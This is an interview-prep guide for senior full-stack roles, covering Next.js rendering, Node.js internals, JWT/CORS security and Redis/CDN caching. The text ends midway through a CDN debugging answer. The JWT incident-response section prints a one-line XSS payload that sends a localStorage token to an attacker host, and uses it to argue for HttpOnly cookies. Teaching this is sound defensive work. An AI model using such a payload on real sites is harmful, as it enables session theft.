# Adobe Computer Scientist 2 — Senior Full-Stack Interview Prep Guide
### Stack: Next.js · Node.js · AWS · PostgreSQL · SQL Server
### Compiled: June 2026 | Sources: OWASP, MDN, Next.js Docs, AWS Docs, Reddit, StackOverflow, Netflix Tech Blog, Meta Engineering, Google Engineering

---

> **HOW TO USE THIS GUIDE:** Every question follows the format:
> 1. **QUESTION** — The exact interview question
> 2. **ANSWER** — A complete, senior-level answer you can speak aloud
> 3. **STUDY REFERENCES** — Links + related topics to deepen your knowledge

---

## ═══════════════════════════════════════
## ROUND 1 — NEXT.JS DEEP DIVE
## ═══════════════════════════════════════

---

### Q1 — Data Fetching Strategy (The Trap Question)

**QUESTION:**
> Explain the difference between `getServerSideProps`, `getStaticProps`, and the App Router's `fetch` with `cache: 'no-store'` vs `revalidate`. Under what real business scenario would you pick each — and what breaks if you pick wrong?

---

**ANSWER:**

These are three distinct rendering paradigms with real performance and correctness tradeoffs:

**`getStaticProps` (Pages Router — SSG):**
- Runs **once at build time** on the server
- Output: a static HTML + JSON file, CDN-cacheable forever
- Use when: marketing pages, blog posts, product listings that change rarely
- **What breaks if wrong:** You use it for user-specific data → ALL users see the same page. You use it for live prices → buyers see stale prices. Both are critical production bugs

**`getServerSideProps` (Pages Router — SSR):**
- Runs **on every single request**, server-side only
- Output: fresh HTML per request, cannot be CDN-cached (or requires careful `Cache-Control` headers)
- Use when: dashboards with user-specific data, pages requiring cookie/header access at render time
- **What breaks if wrong:** You use it for a landing page → every visit triggers a DB call. At scale this kills your database with unnecessary reads

**App Router `fetch` with `cache: 'no-store'` (equivalent to SSR):**
- Opts out of all caching. Fresh data on every request
- Fine-grained — you can have some components cached and some not on the same page
- Replaces `getServerSideProps` in App Router

**App Router `fetch` with `next: { revalidate: 60 }` (equivalent to ISR):**
- Caches the response, regenerates in the background after N seconds (stale-while-revalidate)
- The "best of both worlds" for most content — fast like static, eventually fresh like SSR
- **What breaks:** The first user AFTER the TTL expires still gets the stale page and triggers the background regeneration. The SECOND user gets the fresh page. This is by design but surprises teams

**Picking guide:**
| Scenario | Strategy |
|---|---|
| Blog post, marketing page | `getStaticProps` or `revalidate: 3600` |
| User dashboard | `getServerSideProps` or `cache: 'no-store'` |
| Product page with shared data | `revalidate: 60` (ISR) |
| Real-time price / stock ticker | Client-side fetch with SWR/React Query |

**Senior-level insight:** In App Router, components are Server Components by default. You compose caching at the component level, not the page level. A page can have a cached header, an uncached user profile section, and an ISR product list all rendering simultaneously using Suspense boundaries.

---

**STUDY REFERENCES:**
- **Next.js Official Docs:** [Data Fetching in App Router](https://nextjs.org/docs/app/getting-started/fetching-data) — live as of March 2026
- **Next.js Official Docs:** [getStaticProps reference](https://nextjs.org/docs/pages/building-your-application/data-fetching/get-static-props)
- **Next.js Official Docs:** [ISR — Incremental Static Regeneration](https://nextjs.org/docs/pages/guides/incremental-static-regeneration)
- **Related:** Next.js caching model diagram — [How Revalidation Works](https://nextjs.org/docs/app/guides/how-revalidation-works)
- **Reddit discussion:** r/nextjs — "When to use SSR vs ISR vs SSG" (search current top posts)
- **Related topics to study:** `revalidatePath`, `revalidateTag`, `use cache` directive (Next.js 15+), React `cache()` memoization, Stale-While-Revalidate HTTP header pattern

---

### Q2 — ISR + User-Specific Data Bug

**QUESTION:**
> Your Next.js app serves a dashboard using `getStaticProps` with ISR. A user says their data is stale for 10 minutes after updating their profile. What went wrong architecturally, and how do you fix it?

---

**ANSWER:**

**Root cause:** `getStaticProps` with ISR is designed for **shared public data** — the same HTML is served to every user. It has no concept of "this user's data." The page is generated once and cached. When User A updates their profile, there is no mechanism to know that the cached page for that URL is now wrong for that user specifically.

**The wrong fix:** Lowering `revalidate` to 30 seconds. This just means stale data for 30s instead of 10 minutes. It doesn't solve the architectural mismatch.

**Correct fixes, in order of preference:**

1. **Split rendering strategy:**
   - Use `getStaticProps` (or `revalidate`) for the page shell/layout (branding, nav, public info)
   - Fetch user-specific data **client-side** using SWR or React Query with `staleTime: 0`
   - This gives you: fast initial paint (static shell) + always-fresh user data

2. **On-demand revalidation (App Router):**
   - After a profile update server action completes, call `revalidatePath('/dashboard')` or `revalidateTag('user-profile')`
   - Forces ISR to regenerate that specific page immediately on next request
   - Works when you can tag your fetches: `fetch(url, { next: { tags: ['user-profile'] } })`

3. **Switch to `getServerSideProps` / `cache: 'no-store'`** for the entire page if data is always user-specific and never cacheable. Accept the tradeoff of no CDN caching.

**Senior-level answer:** The real fix is hybrid. Static shell + on-demand revalidation triggered from your mutation logic + client-side optimistic updates in the UI using React Query. This gives the 99% case (read-only) full CDN performance, while the 1% case (post-update) gets fresh data immediately.

---

**STUDY REFERENCES:**
- **Next.js Docs:** [On-Demand Revalidation](https://nextjs.org/docs/app/guides/how-revalidation-works)
- **Next.js API:** [`revalidatePath`](https://nextjs.org/docs/app/api-reference/functions/revalidatePath) | [`revalidateTag`](https://nextjs.org/docs/app/api-reference/functions/revalidateTag)
- **SWR Docs:** [https://swr.vercel.app/](https://swr.vercel.app/) — staleTime, revalidateOnMount
- **TanStack Query:** [https://tanstack.com/query/latest](https://tanstack.com/query/latest)
- **Related topics:** Cache tags, cache invalidation strategies, optimistic UI updates, mutation + revalidation pattern

---

### Q3 — React Hydration Mismatch

**QUESTION:**
> Your senior dev pushed code causing a React hydration mismatch in production only — works in dev. Walk me through debugging this. What are the top 3 causes at enterprise scale?

---

**ANSWER:**

**What hydration mismatch means:** The HTML rendered on the server does not match what React renders on the client during hydration. React throws a warning (or error in strict mode), discards the server HTML, and re-renders from scratch — killing the performance benefit of SSR entirely.

**Why it's production-only:** Next.js dev mode runs in `React.StrictMode` which double-invokes renders AND has better error overlay. But some environment differences only manifest in production builds (minification, different env vars, no dev-only polyfills).

**Debugging steps:**
1. Enable `suppressHydrationWarning={true}` on the specific element temporarily to isolate the component
2. Check the browser console — React's error message usually includes what the server rendered vs what the client rendered
3. Add `console.log` in both server and client render paths (use `typeof window === 'undefined'` to differentiate)
4. Use React DevTools Profiler to find the component subtree with the mismatch

**Top 3 causes at enterprise scale:**

**Cause 1: Date/Time rendering without timezone normalization**
```jsx
// WRONG — server renders UTC, client renders local timezone
<p>Last updated: {new Date().toLocaleDateString()}</p>

// FIX — use a stable UTC format or useEffect to show time client-side
const [mounted, setMounted] = useState(false);
useEffect(() => setMounted(true), []);
if (!mounted) return <p>Last updated: Loading...</p>;
```

**Cause 2: Accessing `window`, `localStorage`, or `navigator` during SSR**
```jsx
// WRONG — window is undefined on server
const theme = localStorage.getItem('theme') || 'dark';

// FIX — guard with typeof check or useEffect
const [theme, setTheme] = useState('dark');
useEffect(() => {
  setTheme(localStorage.getItem('theme') || 'dark');
}, []);
```

**Cause 3: Third-party libraries that read browser APIs during render**
Common culprits: `uuid` (generates random IDs differently), analytics libraries, A/B testing tools that modify the DOM before hydration. Fix: lazy-load with `dynamic(() => import('./Component'), { ssr: false })`.

**Production-specific fourth cause:** Different data between server and client due to race condition — SSR fetches data at time T, by the time client hydrates, a background refetch returns different data. Fix: use `initialData` in React Query to seed client from server-fetched props.

---

**STUDY REFERENCES:**
- **React Official Docs:** [Hydration errors](https://react.dev/reference/react-dom/client/hydrateRoot#suppressing-unavoidable-hydration-mismatch-errors)
- **Next.js Guide:** [Preventing Flash Before Hydration](https://nextjs.org/docs/app/guides/preventing-flash-before-hydration)
- **MDN:** [Web Storage API - localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- **Stack Overflow:** Search "Next.js hydration mismatch production" — highly active thread
- **Related topics:** `dynamic()` with `ssr: false`, `useEffect` as mount guard, server vs client component boundary, React 19 hydration improvements

---

## ═══════════════════════════════════════
## ROUND 2 — NODE.JS INTERNALS & PRODUCTION
## ═══════════════════════════════════════

---

### Q4 — Event Loop + File Upload Bottleneck

**QUESTION:**
> Your Node.js API handles file uploads and simultaneously serves read requests. Under load, reads start timing out. You haven't hit CPU limits. What's happening?

---

**ANSWER:**

**Root cause:** The `libuv` thread pool (default size: **4 threads**) is saturated by file I/O operations.

**How Node.js actually works:**
- The Event Loop runs in a **single main thread** (JavaScript execution)
- I/O-bound operations (disk reads, DNS, crypto, zlib) are offloaded to `libuv`'s thread pool
- By default, libuv has only **4 worker threads** (`UV_THREADPOOL_SIZE=4`)
- When all 4 threads are busy processing file uploads (buffering, writing to disk), ALL other I/O operations queue behind them — including your read requests
- This is why CPU looks fine: the bottleneck is thread pool exhaustion, not CPU

**Why reads timeout specifically:**
- File uploads are long-running I/O operations (large files = held threads for seconds)
- Read requests (DB queries, small file reads) are also I/O — they join the same queue
- Reads that normally take 5ms now wait 2000ms for a thread — request timeout fires

**Diagnosis steps:**
```bash
# Check active handles and requests
node --inspect server.js
# In Chrome DevTools: Memory > Heap snapshot, look for pending I/O

# Add metrics
process.env.UV_THREADPOOL_SIZE  # check current setting
```

**Fixes, in order:**

1. **Increase thread pool size** (immediate, quick win):
   ```bash
   UV_THREADPOOL_SIZE=16 node server.js
   # Or in code (must be set BEFORE any I/O):
   process.env.UV_THREADPOOL_SIZE = 16;
   ```
   Cap at `CPU cores * 4` maximum — beyond that you get thread contention overhead

2. **Stream uploads instead of buffering:**
   ```js
   // Don't buffer the entire file in memory — pipe directly to S3 or disk
   req.pipe(uploadStream); // avoids holding thread for entire file duration
   ```

3. **Offload uploads to a dedicated worker service** (architectural fix):
   - Uploads go to a separate Node.js process / microservice / Lambda
   - Read API is isolated from upload I/O pressure entirely

4. **Use S3 pre-signed URLs** for direct browser-to-S3 uploads — your Node server is completely out of the upload path

---

**STUDY REFERENCES:**
- **Node.js Docs:** [The Node.js Event Loop](https://nodejs.org/en/learn/asynchronous-work/event-loop-timers-and-nexttick)
- **libuv Docs:** [Thread pool work scheduling](http://docs.libuv.org/en/v1.x/threadpool.html)
- **Node.js Docs:** [Don't Block the Event Loop](https://nodejs.org/en/learn/best-practices/dont-block-the-event-loop)
- **Medium (Deepal Jayasekara):** "Node.js Event Loop" series — highly recommended visual explanation
- **Related topics:** `worker_threads`, `UV_THREADPOOL_SIZE`, streams in Node.js, backpressure, piping, S3 presigned URLs

---

### Q5 — Memory Leak in Production

**QUESTION:**
> Your Node service's heap keeps growing every 24 hours until it crashes. Name 5 non-obvious causes and how you'd identify each with specific tools.

---

**ANSWER:**

**Non-obvious causes (beyond the obvious circular references):**

**Cause 1: Unbounded in-memory caches / Maps**
```js
// Pattern: cache that grows forever with no eviction
const cache = new Map();
app.get('/user/:id', (req, res) => {
  cache.set(req.params.id, heavyObject); // never deleted
});
```
**Identification:** `node --inspect` → Chrome DevTools Memory tab → take heap snapshot at T=0 and T+1hr → compare "Comparison" view → look for growing `Map` entries or arrays

**Cause 2: Listeners attached in request handlers (never removed)**
```js
// WRONG — adds a new listener on EVERY request
app.get('/stream', (req, res) => {
  emitter.on('data', handler); // 10,000 requests = 10,000 listeners
  // Missing: emitter.off('data', handler) when request ends
});
```
**Identification:** `emitter.listenerCount('data')` logged over time. `process.setMaxListeners(0)` will hide the default warning — remove that line to surface the error

**Cause 3: Closures capturing large objects in timers / intervals**
```js
const bigData = loadEverythingFromDB(); // 100MB
setInterval(() => {
  console.log(bigData.length); // bigData is captured, never GC'd
}, 1000);
```
**Identification:** Heap snapshot → filter by "Detached" objects → look for closure retaining large objects via the Retainers chain

**Cause 4: `req`/`res` objects stored in long-lived arrays for logging**
```js
const activeRequests = [];
app.use((req, res, next) => {
  activeRequests.push(req); // req holds body, headers, stream — never cleaned up
  next();
});
```
**Identification:** Heap snapshot → filter `IncomingMessage` objects → check Retainers

**Cause 5: Winston / logging library log queue overflow**
If your log transport (file, CloudWatch) is slow, Winston's internal queue buffers all log entries in memory. Under high traffic this can grow unbounded.
**Identification:** `winston.transports[0].writableLength` — monitor this metric. Add `maxsize` and `maxFiles` rotation to file transports. Use async transports properly

**Tools:**
- `node --inspect` → Chrome DevTools Memory Profiler (heap snapshots, allocation timeline)
- `clinic.js` — `clinic heap` command wraps your server and generates visual memory reports
- `memwatch-next` npm package — fires GC events and detects heap growth
- AWS CloudWatch Memory metrics (with CloudWatch Agent) for production trend analysis
- `v8.writeHeapSnapshot()` — triggered programmatically when heap exceeds threshold

---

**STUDY REFERENCES:**
- **Node.js Docs:** [Memory Debugging](https://nodejs.org/en/learn/diagnostics/memory/using-heap-profiler)
- **Chrome DevTools:** [Memory problems guide](https://developer.chrome.com/docs/devtools/memory-problems/)
- **clinic.js:** [https://clinicjs.org/](https://clinicjs.org/) — flame graphs, heap analysis
- **Netflix Tech Blog:** Search "Node.js memory" on [Netflix TechBlog](https://netflixtechblog.com/)
- **Related topics:** V8 garbage collector, WeakMap/WeakRef for cache patterns, Node.js streams backpressure, EventEmitter best practices

---

### Q6 — Cluster vs Worker Threads vs Kubernetes

**QUESTION:**
> When do you use `cluster` vs `worker_threads` vs more Kubernetes pods?

---

**ANSWER:**

**`cluster` module:**
- Spawns multiple **Node.js processes** (each with its own Event Loop, V8 heap, memory space)
- Uses IPC (Inter-Process Communication) to share the same port
- **When to use:** CPU-bound workloads on a single machine where you want to utilize all CPU cores. Each worker handles independent requests
- **Key trait:** No shared memory — each process is fully isolated
- **Real usage:** `pm2 -i max` does this automatically in production

**`worker_threads`:**
- Spawns threads **within the same Node.js process** — shared memory via `SharedArrayBuffer`
- Lower overhead than processes (no separate V8 heap per worker)
- **When to use:** CPU-intensive computations that shouldn't block the Event Loop — image processing, PDF generation, cryptography, data transformation
- **Key difference from cluster:** Worker threads can share memory. Cluster workers cannot
- **Wrong usage:** Using worker_threads for I/O operations — waste of threads since Node already handles I/O asynchronously

**More Kubernetes pods:**
- Horizontal scaling at the infrastructure level
- **When to use:** When your service needs to scale beyond a single machine, when you need fault isolation (a crashing pod doesn't affect others), when you have traffic spikes needing elastic scale
- **Key difference:** Pods don't share memory at all. State must be external (Redis, DB)

**Decision matrix:**
| Scenario | Solution |
|---|---|
| 8-core machine, want to handle 8x requests | `cluster` (or pm2) |
| Need to process images without blocking API responses | `worker_threads` |
| Traffic spikes requiring auto-scaling | Kubernetes HPA + more pods |
| CPU + scale | All three together: pods per AZ, cluster per pod |

**What the junior dev gets wrong:** Cluster and Kubernetes are not "the same thing." Cluster is intra-machine. Kubernetes is inter-machine. In production you use both: multiple pods (K8s), each pod running a cluster (multiple Node processes).

---

**STUDY REFERENCES:**
- **Node.js Docs:** [Cluster module](https://nodejs.org/api/cluster.html)
- **Node.js Docs:** [Worker threads](https://nodejs.org/api/worker_threads.html)
- **Node.js Guide:** [Worker threads vs Cluster](https://nodejs.org/en/learn/asynchronous-work/dont-block-the-event-loop#worker-threads)
- **pm2 Docs:** [Cluster mode](https://pm2.keymetrics.io/docs/usage/cluster-mode/)
- **Related topics:** `SharedArrayBuffer`, `Atomics`, message passing between threads, IPC, Kubernetes HPA (Horizontal Pod Autoscaler)

---

## ═══════════════════════════════════════
## ROUND 3 — SECURITY (JWT / AUTH)
## ═══════════════════════════════════════

---

### Q7 — Stolen JWT — Full Incident Response

**QUESTION:**
> A user's JWT access token gets stolen via XSS. Your tokens are valid for 15 minutes. What is your complete incident response AND architectural remediation?

---

**ANSWER:**

**Immediate incident response:**

1. **Identify scope:** Check your logs — what endpoints did the stolen token hit? What data was accessed? This is a data breach assessment
2. **Force invalidation:** Add the token's `jti` (JWT ID) claim to a **token denylist** in Redis. Every auth middleware check must query this list
3. **Force logout:** Invalidate all refresh tokens for the affected user in your DB — setting `revoked = true`
4. **Notify the user:** Security best practice + legal requirement depending on jurisdiction (GDPR Article 33 — 72hr notification to DPA)
5. **Rotate secrets:** If the attack suggests wider compromise, rotate your JWT signing keys

**Root cause — Why XSS could steal the token:**
The token was stored in `localStorage` or `sessionStorage` — both accessible via `document.cookie` or JavaScript. XSS payload:
```js
fetch('https://attacker.com/steal?token=' + localStorage.getItem('jwt'));
```

**Architectural remediation (the real answer they want):**

**Layer 1 — Storage (most critical):**
```
BAD:  localStorage.setItem('token', jwt)  // accessible via JS
BAD:  sessionStorage.setItem('token', jwt)  // accessible via JS
GOOD: HttpOnly cookie — JS cannot read it, browser sends it automatically
```
```http
Set-Cookie: access_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/api
```

**Layer 2 — Token fingerprinting (OWASP recommendation):**
- On login: generate a random string `fingerprint`
- Store SHA256(`fingerprint`) **inside the JWT payload** (`fgp` claim)
- Send raw `fingerprint` as a `HttpOnly; Secure; SameSite=Strict` cookie separately
- On every request: verify `SHA256(cookie_fingerprint) === jwt.fgp`
- If attacker steals the JWT from XSS, they can read the token but they CANNOT read the HttpOnly cookie containing the fingerprint → token is useless to them

**Layer 3 — Short-lived access tokens + refresh token rotation:**
- Access token: 15 minutes (you already have this)
- Refresh token: stored in HttpOnly cookie, 7 days, single-use with rotation
- Every refresh: old refresh token is invalidated, new one issued

**Layer 4 — Content Security Policy:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' https://api.yourdomain.com
```
This prevents XSS from phoning home to an attacker's domain even if injected

**Headers to add regardless:**
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

**STUDY REFERENCES:**
- **OWASP:** [JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) — Token Sidejacking section (live source used for this answer)
- **OWASP:** [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **OWASP:** [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- **Auth0 Blog:** [Refresh Tokens: When to use them](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)
- **MDN:** [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute)
- **Related topics:** `jti` claim, token denylist with Redis TTL, `HttpOnly` cookies, CSP headers, GDPR breach notification

---

### Q8 — Refresh Token Rotation Race Condition

**QUESTION:**
> What happens if a legitimate user's refresh token request fails due to a network error right after the server has already rotated and invalidated the old token? How do you handle this without logging them out?

---

**ANSWER:**

**The scenario:**
1. User's client sends `refresh_token_v1` to `/auth/refresh`
2. Server receives it, validates it, generates `refresh_token_v2`, **invalidates `v1`** in DB, sends response
3. Response is lost due to network error (mobile flap, timeout, packet loss)
4. Client still has `refresh_token_v1` (it was never swapped)
5. Client retries `/auth/refresh` with `v1` — server says "token revoked" → user logged out

This is a **real production bug** that causes legitimate user logouts, and it gets worse on mobile clients.

**Solution 1 — Grace period / re-use detection with tolerance:**
```sql
-- DB schema
refresh_tokens (
  token_hash VARCHAR PRIMARY KEY,
  user_id UUID,
  revoked_at TIMESTAMP,
  successor_token_hash VARCHAR, -- the new token that replaced this one
  issued_at TIMESTAMP
)
```
- When `v1` is used to rotate → generate `v2`, store `v1.successor = v2`
- If `v1` is presented again within a short grace window (e.g., 30 seconds after `revoked_at`):
  - If `v1.successor` exists and is still valid → re-issue `v2` (idempotent rotation)
  - If `v1.successor` was already used to issue `v3` → this is likely token theft → revoke the entire chain for this user
- **This is Auth0's approach** — they call it "automatic reuse detection"

**Solution 2 — Idempotency key on the refresh endpoint:**
Client sends `Idempotency-Key: <uuid>` header with each refresh. Server stores `(idempotency_key, response_body)` in Redis for 60 seconds. Retry returns the cached response.

**Solution 3 — Sliding window refresh (simpler for most apps):**
Instead of revoking `v1` before `v2` is confirmed received, use a short **overlap window** — `v1` remains valid for 30 seconds after `v2` is issued. Client has 30s to commit the swap. This is less secure but handles the race for low-security apps.

**Senior recommendation:** Implement Solution 1 (successor chain). Log all reuse attempts. Alert on chains where multiple successors are issued from a single original token — that's your stolen token indicator.

---

**STUDY REFERENCES:**
- **Auth0 Blog:** [Refresh Token Rotation](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)
- **RFC 6749:** [OAuth 2.0 — Refresh Token rotation spec](https://tools.ietf.org/html/rfc6749#section-10.4)
- **OWASP:** [JWT Cheat Sheet — No Built-In Token Revocation](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- **Stack Overflow:** "refresh token rotation race condition" — active discussion
- **Related topics:** Idempotency keys, Redis TTL for token storage, `jti` claim family tracking, OAuth 2.1 (proposed successor to OAuth 2.0)

---

### Q9 — CORS Wildcard Bug

**QUESTION:**
> Your API has `Access-Control-Allow-Origin: *`. Security flags it critical. You restrict to your domain. Mobile team's requests fail. Fix it correctly for a multi-client API.

---

**ANSWER:**

**Why `*` is flagged critical:**
- `*` allows **any origin** to make credentialed cross-origin requests
- Combined with `Access-Control-Allow-Credentials: true`, it enables cross-site request forgery at the API level
- An attacker's page at `evil.com` can make authenticated API calls on behalf of your logged-in users

**Why restricting to one domain breaks mobile:**
Mobile apps don't run in a browser — they make requests from `null` origin or custom schemes (`myapp://`, Capacitor, React Native). They aren't subject to CORS at all, but if your server sends a restrictive `Access-Control-Allow-Origin` header, it might be included in the response and confuse proxies or wrappers.

The real issue is typically that your **internal corporate frontend**, **partner portal**, or **staging environment** also needs CORS access but wasn't included in the allowed list.

**Correct fix — Dynamic origin allowlist:**
```js
// Node.js / Express
const allowedOrigins = [
  'https://app.yourdomain.com',
  'https://partner.theirdomain.com',
  'https://staging.yourdomain.com',
  // Mobile apps: no origin needed — they're not browsers
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (!origin || allowedOrigins.includes(origin)) {
    // No origin header = server-to-server or mobile = allow
    if (origin) {
      res.setHeader('Access-Control-Allow-Origin', origin);
      res.setHeader('Vary', 'Origin'); // CRITICAL — tells CDN to cache separately per origin
    }
  } else {
    return res.status(403).json({ error: 'CORS: Origin not allowed' });
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  next();
});
```

**Critical `Vary: Origin` header:** Without this, CDNs (CloudFront, etc.) will cache a response with one `Access-Control-Allow-Origin` value and serve it to all origins. This causes either broken CORS for some clients or security bypass for others.

**For mobile specifically:** React Native / Capacitor make requests without an `Origin` header in most cases. The above code's `!origin` check passes those through untouched.

---

**STUDY REFERENCES:**
- **MDN:** [CORS — Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- **MDN:** [`Vary` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary)
- **OWASP:** [CORS Security](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- **PortSwigger Web Security:** [CORS vulnerabilities](https://portswigger.net/web-security/cors)
- **Related topics:** Preflight requests, `OPTIONS` method, `SameSite` cookie relationship to CORS, CSRF tokens as defense-in-depth

---

## ═══════════════════════════════════════
## ROUND 4 — CACHING (MULTI-LAYER)
## ═══════════════════════════════════════

---

### Q10 — Multi-Layer Cache Strategy Design

**QUESTION:**
> Design a caching strategy for a product page with: product description (changes rarely), stock count (changes every second), personalized recommendations (user-specific), and price (changes with promotions).

---

**ANSWER:**

**The key insight:** Not all data on a single page has the same cacheability. You must cache each data type at its appropriate layer with its appropriate TTL.

**Layer 1 — CDN/Edge Cache (CloudFront, Vercel Edge, Cloudflare):**
- Only cache **public, non-personalized** content
- Product description: `Cache-Control: public, max-age=3600, stale-while-revalidate=86400`
- Segment the cache by product ID (path-based)
- Do NOT cache pages with user-specific data at CDN level — serve a shared shell

**Layer 2 — Application Cache (Redis):**
```
Key: product:{id}:description  → TTL: 1 hour (changes rarely)
Key: product:{id}:price        → TTL: 60 seconds + pub/sub invalidation on promo events
Key: product:{id}:stock        → TTL: 5 seconds (changes per second — short TTL acceptable)
Key: user:{uid}:recommendations → TTL: 5 minutes (user-specific — can't CDN cache)
```
For stock count: Don't cache at all if accuracy is critical. Use Redis as the source of truth (`DECRBY`) rather than caching DB queries. Redis can handle 100K+ ops/second for a counter

**Layer 3 — Client-Side Cache (SWR / React Query / HTTP cache):**
```js
// Product description — cache for 1hr, don't revalidate on focus
useQuery('product-desc', fetchDesc, { staleTime: 3600000 })

// Stock — poll every 5 seconds
useQuery('stock', fetchStock, { refetchInterval: 5000, staleTime: 0 })

// Price — cache 60s, revalidate on window focus
useQuery('price', fetchPrice, { staleTime: 60000 })

// Recommendations — user session scoped
useQuery(['recommendations', userId], fetchRecs, { staleTime: 300000 })
```

**Architecture — Fragment-based caching (ideal):**
Use Next.js App Router with Suspense boundaries:
```jsx
<StaticShell>  {/* CDN cached, ISR */}
  <Suspense><ProductDescription id={id} /></Suspense>  {/* revalidate: 3600 */}
  <Suspense><PriceDisplay id={id} /></Suspense>         {/* revalidate: 60 */}
  <Suspense><StockIndicator id={id} /></Suspense>       {/* cache: no-store */}
  <Suspense><PersonalizedRecs userId={userId} /></Suspense>  {/* cache: no-store */}
</StaticShell>
```

**Senior-level point:** For the stock count specifically, consider **Server-Sent Events or WebSockets** instead of polling — push the update when it changes rather than 200 clients polling every 5 seconds. At scale this is the difference between 2M requests/day vs 1000 push events/day.

---

**STUDY REFERENCES:**
- **MDN:** [HTTP caching](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching) — `Cache-Control` directive reference
- **Redis Docs:** [Data types — Strings (counters)](https://redis.io/docs/data-types/strings/)
- **Next.js Docs:** [CDN Caching guide](https://nextjs.org/docs/app/guides/cdn-caching)
- **Google Web.dev:** [HTTP cache best practices](https://web.dev/http-cache/)
- **Cloudflare Blog:** Cache strategy articles
- **Related topics:** `stale-while-revalidate` HTTP header, Redis pub/sub for cache invalidation, ESI (Edge Side Includes), partial page caching, fragment caching

---

### Q11 — Selective Redis Cache Invalidation

**QUESTION:**
> You need to flush stale price data from Redis. The Redis has 2M keys. `FLUSHALL` takes down other services. How do you selectively invalidate?

---

**ANSWER:**

**Why FLUSHALL is nuclear:** All 2M keys are gone — including sessions, rate-limit counters, feature flags for OTHER services. This is why shared Redis instances in production are dangerous.

**Correct approaches:**

**Approach 1 — Pattern-based deletion with SCAN (not KEYS):**
```js
// NEVER use KEYS in production — it blocks Redis while scanning
// redis.keys('price:*') → O(N) blocking operation on 2M keys

// CORRECT — use SCAN with cursor (non-blocking, incremental)
async function deleteByPattern(pattern) {
  let cursor = '0';
  do {
    const [nextCursor, keys] = await redis.scan(cursor, 'MATCH', pattern, 'COUNT', 100);
    cursor = nextCursor;
    if (keys.length) {
      await redis.del(...keys);
    }
  } while (cursor !== '0');
}

await deleteByPattern('product:*:price');
```
`SCAN` returns 100 keys per iteration, non-blocking. Redis remains responsive throughout.

**Approach 2 — Cache tags (best architectural approach):**
Use Redis `SMEMBERS` sets to group related keys:
```js
// On write: tag the key
await redis.set('product:123:price', price, 'EX', 60);
await redis.sadd('tag:promotion:SUMMER2026', 'product:123:price');
await redis.sadd('tag:promotion:SUMMER2026', 'product:456:price');

// On promo update: invalidate all tagged keys
async function invalidateTag(tag) {
  const keys = await redis.smembers(`tag:${tag}`);
  if (keys.length) {
    await redis.del(...keys);
    await redis.del(`tag:${tag}`); // Clean up the tag set itself
  }
}
await invalidateTag('promotion:SUMMER2026');
```
This is exactly how Next.js `revalidateTag` works under the hood.

**Approach 3 — Namespace isolation (prevent this problem entirely):**
Use separate Redis databases or separate Redis instances per service:
```
redis://redis-host/0  → sessions (never flush)
redis://redis-host/1  → product cache (safe to flush)
redis://redis-host/2  → rate limiting
```
Or use Redis key prefixes as a convention: `<service>:<version>:<resource>:<id>`

**Approach 4 — Cache versioning:**
```js
const CACHE_VERSION = 'v3'; // bump on deploy
const key = `${CACHE_VERSION}:product:${id}:price`;
```
Old `v2:*` keys naturally expire via TTL. No explicit invalidation needed.

---

**STUDY REFERENCES:**
- **Redis Docs:** [SCAN command](https://redis.io/commands/scan/) — why to use over KEYS
- **Redis Docs:** [SMEMBERS — Sets for grouping](https://redis.io/commands/smembers/)
- **Antirez (Redis creator) blog:** [Redis as a cache](http://antirez.com/news/93)
- **Stack Overflow:** "Redis delete keys by pattern without KEYS" — highly upvoted
- **Related topics:** Redis pipelining, Redis Cluster key distribution (hash slots), `UNLINK` vs `DEL` (async deletion), cache versioning patterns

---

### Q12 — CDN Stale Content Debugging

**QUESTION:**
> A European user sees outdated content 20 minutes after publish. Origin shows correct data. Trace the full request path and explain every stale cache point.

---

**ANSWER:**

**Full request path trace:**

```
Browser → ISP DNS Cache → CloudFront Edge (eu-west-1) → 
CloudFront Origin Shield → Origin Server (us-east-1) →  
Next.js Cache (ISR data cache) → Database
```

**Every point where staleness can live:**

**Point 1 — Browser HTTP Cache:**
- `Cache-Control: max-age=1200` (20 minutes) on the response → browser won't even hit CDN
- Check: Open Network tab → check `Cache-Control` response header → look for `Age` header (time since CDN cached it)
- Fix: Lower `max-age` or use `stale-while-revalidate` to background-refresh without blocking

**Point 2 — CloudFront Edge Cache (most likely culprit):**
- CloudFront caches the response at the closest edge to Europe (Frankfurt, Dublin, etc.)
- Default TTL can be up to 24 hours if origin doesn't set explicit `Cache-Control`
- `Age` response header tells you how old the cached object is
- Fix: Trigger a **CloudFront cache invalidation** via AWS Console or API:
  ```bash
  aws cloudfront create-invalidation \
    --distribution-id E1234567890 \
    --paths "/products/123" "/products/*"
  ```
  Wildcards supported. Takes 30-60 seconds to propagate globally.

**Point 3 — CloudFront Origin Shield (if enabled):**
- Optional middle layer between edge and origin — adds another cache hop
- Check: `Via` response header — if you see multiple CloudFront headers, Origin Shield is in the path
- Same invalidation API applies

**Point 4 — Next.js ISR Data Cache:**
- If Next.js ISR has a long `revalidate` period, the Origin Server itself is serving stale HTML
- Check: Hit origin directly (bypass CloudFront via `Host` header override)
